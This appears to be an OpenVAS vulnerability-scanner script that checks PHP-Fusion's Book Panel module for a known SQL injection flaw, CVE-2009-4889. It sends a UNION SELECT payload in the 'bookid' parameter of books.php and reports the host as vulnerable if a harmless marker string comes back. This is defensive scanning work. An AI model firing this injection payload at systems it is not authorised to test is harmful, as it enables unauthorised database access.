###############################################################################
# OpenVAS Vulnerability Test
# $Id: PHPFusion_book_panel_module_sql_injection.nasl 5668 2017-03-21 14:16:34Z cfi $
#
# PHP-Fusion Book Panel Module 'books.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:php-fusion:php-fusion";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100043");
  script_version("$Revision: 5668 $");
  script_tag(name:"last_modification", value:"$Date: 2017-03-21 15:16:34 +0100 (Tue, 21 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
  script_bugtraq_id(34049);
  script_cve_id("CVE-2009-4889");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("PHP-Fusion Book Panel Module 'books.php' SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("secpod_php_fusion_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("php-fusion/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34049");

  tag_summary = "The Book Panel module for PHP-Fusion is prone to an SQL-injection
  vulnerability because it fails to sufficiently sanitize
  user-supplied data before using it in an SQL query.";

  tag_impact = "Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/book_panel/books.php?&bookid=-1+union+select+1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6--";
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

if( "OpenVAS-SQL-Injection-Test" >< buf ) {    
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
